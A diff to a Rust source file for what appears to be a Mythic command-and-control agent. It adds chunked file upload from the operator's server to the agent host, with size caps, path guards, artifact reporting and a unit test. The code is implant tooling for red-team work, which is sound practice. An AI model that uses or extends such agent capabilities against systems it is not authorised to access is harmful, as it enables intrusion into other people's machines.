@@ -1,4 +1,4 @@
-//! File upload (Mythic → agent).
+//! File upload (Mythic -> agent).
 //!
 //! Receives base64-encoded file bytes in task parameters, decodes them
 //! **incrementally** with [`base64::DecoderReader`], and streams the result
@@ -23,12 +23,15 @@
 use std::io::{Read, Write};
 use std::path::{Path, PathBuf};
 
+use base64::Engine;
 use base64::engine::general_purpose::STANDARD;
 use base64::read::DecoderReader;
-use mythic::{TaskMessage, TaskResponse};
+use mythic::{Artifact, TaskMessage, TaskResponse, TaskUpload};
 use serde::Deserialize;
+use uuid::Uuid;
 
 use crate::common::pathguard::{display_path, is_protected_path, normalize_user_path};
+use crate::dispatch::PostResponseReceipt;
 
 // ── Params ──────────────────────────────────────────────────
 
@@ -40,7 +43,11 @@ struct Params {
     #[serde(default)]
     original_filename: Option<String>,
     /// Base64-encoded file contents.
-    file_bytes: String,
+    #[serde(default)]
+    file_bytes: Option<String>,
+    /// Mythic file UUID for chunk-pull uploads.
+    #[serde(default)]
+    file_id: Option<Uuid>,
     /// When true, allows writes to system / boot directories that are
     /// usually destructive to overwrite. Default false.
     #[serde(default)]
@@ -48,6 +55,8 @@ struct Params {
     /// Override the decoded-size cap. Clamped to [1, MAX_UPLOAD_BYTES].
     #[serde(default)]
     max_bytes: Option<u64>,
+    #[serde(default)]
+    host: Option<String>,
 }
 
 // ── Constants ───────────────────────────────────────────────
@@ -57,9 +66,26 @@ struct Params {
 /// operator-controlled host. Memory is bounded to ~16 KiB regardless
 /// (buffered reader + writer).
 const MAX_UPLOAD_BYTES: u64 = 256 * 1024 * 1024;
+const UPLOAD_CHUNK_SIZE: u32 = 512 * 1024;
 /// Read chunk for the base64 DecoderReader. 16 KiB balances syscall
 /// overhead against memory footprint.
 const DECODE_CHUNK: usize = 16 * 1024;
+
+struct PendingUpload {
+    task_id: Uuid,
+    file_id: Uuid,
+    dest: PathBuf,
+    display_dest: String,
+    max_bytes: u64,
+    written: u64,
+    chunk_size: u32,
+    host: Option<String>,
+}
+
+thread_local! {
+    static PENDING_UPLOADS: std::cell::RefCell<std::collections::HashMap<Uuid, PendingUpload>> =
+        std::cell::RefCell::new(std::collections::HashMap::new());
+}
 
 fn clean_filename(name: &str) -> Option<String> {
     let normalized = normalize_user_path(name);
@@ -93,6 +119,134 @@ fn upload_destination(path: &str, original_filename: Option<&str>) -> Result<Pat
         return Ok(dest.join(filename));
     }
     Ok(dest)
+}
+
+fn upload_request(state: &PendingUpload, chunk_num: u32) -> TaskResponse {
+    TaskResponse {
+        task_id: state.task_id,
+        completed: Some(false),
+        status: Some("processing".into()),
+        user_output: Some(format!(
+            "fetching upload chunk {} for {}",
+            chunk_num, state.display_dest
+        )),
+        upload: Some(TaskUpload {
+            chunk_size: state.chunk_size,
+            file_id: state.file_id,
+            chunk_num,
+            full_path: Some(state.display_dest.clone()),
+            host: state.host.clone(),
+        }),
+        ..Default::default()
+    }
+}
+
+fn upload_complete_response(state: &PendingUpload) -> TaskResponse {
+    TaskResponse {
+        task_id: state.task_id,
+        completed: Some(true),
+        status: Some("completed".into()),
+        user_output: Some(format!(
+            "uploaded {} bytes to {}",
+            state.written, state.display_dest
+        )),
+        artifacts: vec![Artifact {
+            base_artifact: "FileWrite".into(),
+            artifact: state.display_dest.clone(),
+            needs_cleanup: true,
+            resolved: true,
+        }],
+        ..Default::default()
+    }
+}
+
+fn cleanup_failed_upload(state: &PendingUpload, message: &str) -> TaskResponse {
+    let _ = std::fs::remove_file(&state.dest);
+    TaskResponse::failed(state.task_id, message)
+}
+
+pub fn responses_from_receipts(receipts: &[PostResponseReceipt]) -> Vec<TaskResponse> {
+    let mut out = Vec::new();
+    for receipt in receipts {
+        let mut state =
+            match PENDING_UPLOADS.with(|cell| cell.borrow_mut().remove(&receipt.task_id)) {
+                Some(state) => state,
+                None => continue,
+            };
+
+        if let Some(error) = &receipt.error {
+            out.push(cleanup_failed_upload(
+                &state,
+                &format!("upload chunk fetch failed: {error}"),
+            ));
+            continue;
+        }
+        if !receipt.status.is_empty() && receipt.status != "success" {
+            out.push(cleanup_failed_upload(
+                &state,
+                &format!("upload chunk fetch failed with status {}", receipt.status),
+            ));
+            continue;
+        }
+
+        let Some(chunk_data) = receipt.chunk_data.as_deref() else {
+            out.push(cleanup_failed_upload(
+                &state,
+                "upload chunk response did not include chunk_data",
+            ));
+            continue;
+        };
+        let chunk = match STANDARD.decode(chunk_data.as_bytes()) {
+            Ok(chunk) => chunk,
+            Err(e) => {
+                out.push(cleanup_failed_upload(
+                    &state,
+                    &format!("upload chunk base64 decode failed: {e}"),
+                ));
+                continue;
+            }
+        };
+        if state.written + chunk.len() as u64 > state.max_bytes {
+            out.push(cleanup_failed_upload(
+                &state,
+                &format!("decoded size exceeds cap {}", state.max_bytes),
+            ));
+            continue;
+        }
+
+        let chunk_num = receipt.chunk_num.unwrap_or(1);
+        let file_result = std::fs::OpenOptions::new()
+            .create(true)
+            .write(true)
+            .append(chunk_num > 1)
+            .truncate(chunk_num == 1)
+            .open(&state.dest)
+            .and_then(|mut file| file.write_all(&chunk));
+        if let Err(e) = file_result {
+            out.push(cleanup_failed_upload(
+                &state,
+                &format!("write {} failed: {e}", state.display_dest),
+            ));
+            continue;
+        }
+        state.written += chunk.len() as u64;
+
+        let total_chunks = receipt.total_chunks.unwrap_or(chunk_num);
+        if chunk_num >= total_chunks {
+            info!(
+                "[upload] wrote {} bytes to {}",
+                state.written, state.display_dest
+            );
+            out.push(upload_complete_response(&state));
+        } else {
+            let next_chunk = chunk_num + 1;
+            out.push(upload_request(&state, next_chunk));
+            PENDING_UPLOADS.with(|cell| {
+                cell.borrow_mut().insert(state.task_id, state);
+            });
+        }
+    }
+    out
 }
 
 // ── Main handler ────────────────────────────────────────────
@@ -135,10 +289,35 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         .unwrap_or(MAX_UPLOAD_BYTES)
         .clamp(1, MAX_UPLOAD_BYTES);
 
+    if let Some(file_id) = params.file_id {
+        let state = PendingUpload {
+            task_id: task.id,
+            file_id,
+            dest: dest.clone(),
+            display_dest: display_path(path),
+            max_bytes: params
+                .max_bytes
+                .unwrap_or(MAX_UPLOAD_BYTES)
+                .clamp(1, MAX_UPLOAD_BYTES),
+            written: 0,
+            chunk_size: UPLOAD_CHUNK_SIZE,
+            host: params.host.filter(|h| !h.trim().is_empty()),
+        };
+        let response = upload_request(&state, 1);
+        PENDING_UPLOADS.with(|cell| {
+            cell.borrow_mut().insert(task.id, state);
+        });
+        return response;
+    }
+
+    let Some(file_bytes) = params.file_bytes else {
+        return TaskResponse::failed(task.id, "upload requires file_id or file_bytes");
+    };
+
     // 3. Stream-decode base64 to disk. DecoderReader pulls from the input
     //    cursor and yields decoded bytes on demand — we never materialise
     //    the full decoded Vec.
-    let cursor = std::io::Cursor::new(params.file_bytes.as_bytes());
+    let cursor = std::io::Cursor::new(file_bytes.as_bytes());
     let mut decoder = DecoderReader::new(cursor, &STANDARD);
 
     let file = match std::fs::File::create(path) {
@@ -194,6 +373,12 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
             written,
             display_path(path)
         )),
+        artifacts: vec![Artifact {
+            base_artifact: "FileWrite".into(),
+            artifact: display_path(path),
+            needs_cleanup: true,
+            resolved: true,
+        }],
         ..Default::default()
     }
 }
@@ -248,5 +433,52 @@ mod tests {
         };
         let resp = handle(&task);
         assert!(resp.status.as_deref() == Some("error"));
+    }
+
+    #[test]
+    fn test_upload_file_id_chunk_pull_and_verify() {
+        let original = b"nanaz upload chunk pull";
+        let file_id = Uuid::from_u128(0x1234);
+        let tmp_path = {
+            let mut p = std::env::temp_dir();
+            p.push(format!("nanaz_up_chunk_test_{}.bin", std::process::id()));
+            p
+        };
+
+        let task = TaskMessage {
+            command: "upload".into(),
+            parameters: serde_json::json!({
+                "path": tmp_path.to_string_lossy(),
+                "file_id": file_id,
+            })
+            .to_string(),
+            ..Default::default()
+        };
+
+        let request = handle(&task);
+        assert_eq!(request.status.as_deref(), Some("processing"));
+        let upload = request.upload.as_ref().expect("upload request set");
+        assert_eq!(upload.file_id, file_id);
+        assert_eq!(upload.chunk_num, 1);
+        assert_eq!(
+            upload.full_path.as_deref(),
+            Some(tmp_path.to_string_lossy().as_ref())
+        );
+
+        let responses = responses_from_receipts(&[PostResponseReceipt {
+            task_id: task.id,
+            status: "success".into(),
+            file_id: Some(file_id),
+            chunk_num: Some(1),
+            total_chunks: Some(1),
+            chunk_data: Some(crate::common::base64::encode(original)),
+            ..Default::default()
+        }]);
+        assert_eq!(responses.len(), 1);
+        assert_eq!(responses[0].completed, Some(true));
+        assert!(responses[0].upload.is_none());
+        assert_eq!(std::fs::read(&tmp_path).unwrap(), original);
+
+        let _ = std::fs::remove_file(tmp_path);
     }
 }
